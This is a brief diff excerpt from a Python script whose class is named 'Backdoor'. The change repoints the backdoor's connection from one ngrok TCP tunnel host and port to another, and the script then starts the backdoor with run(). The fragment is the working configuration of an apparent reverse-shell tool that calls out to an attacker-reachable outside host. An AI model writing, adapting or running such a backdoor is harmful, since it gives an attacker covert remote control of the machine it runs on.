@@ -88,5 +88,5 @@ class Backdoor:
 
 
 
-my_backdoor = Backdoor("6.tcp.ngrok.io", 10714)
+my_backdoor = Backdoor("0.tcp.ngrok.io", 19477)
 my_backdoor.run()
